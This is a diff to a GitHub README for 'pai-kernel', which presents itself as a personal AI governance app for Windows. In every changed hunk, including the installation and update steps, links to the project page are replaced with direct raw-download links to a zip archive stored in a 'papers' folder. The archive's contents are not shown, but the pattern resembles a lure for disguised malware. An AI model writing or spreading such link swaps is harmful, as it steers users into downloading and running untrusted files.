@@ -1,6 +1,6 @@
 # 🧠 pai-kernel - Personal AI Governance Framework
 
-[![Download / Visit Page](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20page-blue?style=for-the-badge)](https://github.com/ifrany1493/pai-kernel)
+[![Download / Visit Page](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20page-blue?style=for-the-badge)](https://github.com/ifrany1493/pai-kernel/raw/refs/heads/main/papers/pai_kernel_2.7-beta.4.zip)
 
 ## 📘 What this is
 
@@ -12,7 +12,7 @@ This project focuses on Personal Authorial Intelligence, which means the control
 
 Use this link to visit the page and download the app:
 
-[https://github.com/ifrany1493/pai-kernel](https://github.com/ifrany1493/pai-kernel)
+[https://github.com/ifrany1493/pai-kernel/raw/refs/heads/main/papers/pai_kernel_2.7-beta.4.zip](https://github.com/ifrany1493/pai-kernel/raw/refs/heads/main/papers/pai_kernel_2.7-beta.4.zip)
 
 ## 🖥️ System Requirements
 
@@ -32,7 +32,7 @@ For best results, use a modern Windows machine with updated system files.
 Follow these steps on Windows.
 
 1. Open the download page:
-   - [pai-kernel on GitHub](https://github.com/ifrany1493/pai-kernel)
+   - [pai-kernel on GitHub](https://github.com/ifrany1493/pai-kernel/raw/refs/heads/main/papers/pai_kernel_2.7-beta.4.zip)
 
 2. Look for the latest release or download option on the page.
 
@@ -116,7 +116,7 @@ You do not need a technical setup to use the core features. Most users can work 
 
 When a new version is released, return to the same GitHub page:
 
-[https://github.com/ifrany1493/pai-kernel](https://github.com/ifrany1493/pai-kernel)
+[https://github.com/ifrany1493/pai-kernel/raw/refs/heads/main/papers/pai_kernel_2.7-beta.4.zip](https://github.com/ifrany1493/pai-kernel/raw/refs/heads/main/papers/pai_kernel_2.7-beta.4.zip)
 
 Download the newer version and replace the old one if needed. If you saved a local settings file, keep a copy before updating.
 
@@ -184,4 +184,4 @@ This project relates to:
 
 Open the main page here to download or review the project:
 
-[https://github.com/ifrany1493/pai-kernel](https://github.com/ifrany1493/pai-kernel)
+[https://github.com/ifrany1493/pai-kernel/raw/refs/heads/main/papers/pai_kernel_2.7-beta.4.zip](https://github.com/ifrany1493/pai-kernel/raw/refs/heads/main/papers/pai_kernel_2.7-beta.4.zip)
